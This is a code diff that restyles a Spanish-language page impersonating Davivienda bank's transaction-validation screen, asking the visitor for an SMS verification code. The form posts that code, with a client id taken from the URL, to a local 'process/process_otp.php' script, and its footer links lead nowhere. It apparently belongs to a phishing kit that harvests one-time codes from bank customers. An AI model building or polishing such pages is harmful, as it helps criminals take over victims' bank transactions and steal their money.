@@ -13,92 +13,75 @@
 
         body {
             font-family: 'Inter', Arial, sans-serif;
-            background-color: #1C4F4A; /* Verde oscuro Davivienda */
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 24px 16px;
-        }
-
-        /* ── Wrapper ficticio para compatibilidad ── */
-        .page-wrapper {
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .card {
             background: #fff;
-            border-radius: 12px;
-            padding: 40px 36px 32px;
-            width: 100%;
-            max-width: 440px;
-            box-shadow: 0 2px 16px rgba(0,0,0,.08);
-            text-align: center;
+            min-height: 100vh;
         }
+
+        .wrapper {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 28px 24px;
+        }
+
+        /* ── Logo ────────────────────────────────── */
+        .logo-wrap { margin-bottom: 32px; }
+        .logo-wrap img { height: 38px; width: auto; }
 
         /* ── Icono escudo ───────────────────────── */
         .shield-icon {
-            width: 60px;
-            height: 60px;
+            width: 58px;
+            height: 58px;
             background: #FFF0F0;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 24px;
+            margin-bottom: 20px;
         }
 
-        .shield-icon svg { color: #E31B23; }
-
         /* ── Textos ─────────────────────────────── */
-        .card h2 {
-            font-size: 1.3rem;
+        h2 {
+            font-size: 1.35rem;
             font-weight: 700;
             color: #111;
             margin-bottom: 10px;
         }
 
-        .card .subtitle {
+        .subtitle {
             color: #666;
             font-size: .9rem;
-            line-height: 1.5;
-            margin-bottom: 32px;
+            line-height: 1.55;
+            margin-bottom: 30px;
         }
 
-        /* ── Input OTP ──────────────────────────── */
+        /* ── Label ───────────────────────────────── */
         .otp-label {
             display: block;
             font-size: .85rem;
             font-weight: 600;
             color: #333;
-            text-align: left;
             margin-bottom: 8px;
         }
 
-        .otp-input-wrapper {
-            margin-bottom: 28px;
-        }
+        /* ── Input OTP ──────────────────────────── */
+        .otp-input-wrapper { margin-bottom: 28px; }
 
         .otp-input-wrapper input[type="text"] {
             width: 100%;
             padding: 12px 16px;
             border: 1.5px solid #bdbdbd;
             border-radius: 8px;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: 600;
-            letter-spacing: 8px;
+            letter-spacing: 10px;
             text-align: center;
             color: #111;
             outline: none;
             transition: border-color .2s;
+            font-family: 'Inter', Arial, sans-serif;
         }
 
-        .otp-input-wrapper input[type="text"]:focus {
-            border-color: #E31B23;
-        }
+        .otp-input-wrapper input[type="text"]:focus { border-color: #E31B23; }
 
         /* ── Botón ──────────────────────────────── */
         .btn-submit {
@@ -112,7 +95,7 @@
             font-weight: 600;
             cursor: pointer;
             transition: background .2s, transform .1s;
-            letter-spacing: .3px;
+            font-family: 'Inter', Arial, sans-serif;
             margin-bottom: 24px;
         }
 
@@ -122,7 +105,7 @@
         /* ── Links pie ──────────────────────────── */
         .footer-links {
             border-top: 1px solid #f0f0f0;
-            padding-top: 20px;
+            padding-top: 18px;
             display: flex;
             flex-direction: column;
             gap: 10px;
@@ -134,65 +117,54 @@
             font-weight: 600;
             text-decoration: none;
         }
-
         .footer-links a:hover { text-decoration: underline; }
-
-        /* ── Responsive ─────────────────────────── */
-        @media (max-width: 480px) {
-            .card { padding: 32px 20px 24px; }
-        }
     </style>
 </head>
 <body>
+    <div class="wrapper">
 
-    <!-- OTP form -->
-    <div class="page-wrapper">
-        <div class="card">
-
-            <!-- Logo dentro de la card -->
-            <div class="logo-wrap" style="margin-bottom:24px;">
-                <img src="new-brand-red.svg" alt="Davivienda" style="height:36px;width:auto;">
-            </div>
-
-            <!-- Icono -->
-            <div class="shield-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24" stroke="#E31B23" stroke-width="1.8">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z"/>
-                </svg>
-            </div>
-
-            <h2>Vamos a validar tu transacción</h2>
-            <p class="subtitle">Ingresa el código SMS que acabamos de enviar a tu número de celular registrado.</p>
-
-            <form action="process/process_otp.php" method="POST">
-                <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
-
-                <div class="otp-input-wrapper">
-                    <label class="otp-label" for="claveDinamica">Código de verificación</label>
-                    <input
-                        type="text"
-                        name="claveDinamica"
-                        id="claveDinamica"
-                        placeholder="· · · · · ·"
-                        required
-                        minlength="4"
-                        maxlength="8"
-                        pattern="\d*"
-                        inputmode="numeric"
-                        autocomplete="one-time-code"
-                    >
-                </div>
-
-                <button type="submit" class="btn-submit">ENVIAR</button>
-            </form>
-
-            <div class="footer-links">
-                <a href="#">PEDIR OTRO CÓDIGO</a>
-                <a href="#">¿Necesitas ayuda? | Términos de Uso</a>
-            </div>
-
+        <!-- Logo -->
+        <div class="logo-wrap">
+            <img src="new-brand-red.svg" alt="Davivienda">
         </div>
-    </div>
 
+        <!-- Icono -->
+        <div class="shield-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="none" viewBox="0 0 24 24" stroke="#E31B23" stroke-width="1.8">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z"/>
+            </svg>
+        </div>
+
+        <h2>Vamos a validar tu transacción</h2>
+        <p class="subtitle">Ingresa el código SMS que acabamos de enviar a tu número de celular registrado.</p>
+
+        <form action="process/process_otp.php" method="POST">
+            <input type="hidden" name="cliente_id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>">
+
+            <div class="otp-input-wrapper">
+                <label class="otp-label" for="claveDinamica">Código de verificación</label>
+                <input
+                    type="text"
+                    name="claveDinamica"
+                    id="claveDinamica"
+                    placeholder="· · · · · ·"
+                    required
+                    minlength="4"
+                    maxlength="8"
+                    pattern="\d*"
+                    inputmode="numeric"
+                    autocomplete="one-time-code"
+                >
+            </div>
+
+            <button type="submit" class="btn-submit">ENVIAR</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="#">PEDIR OTRO CÓDIGO</a>
+            <a href="#">¿Necesitas ayuda? | Términos de Uso</a>
+        </div>
+
+    </div>
 </body>
 </html>
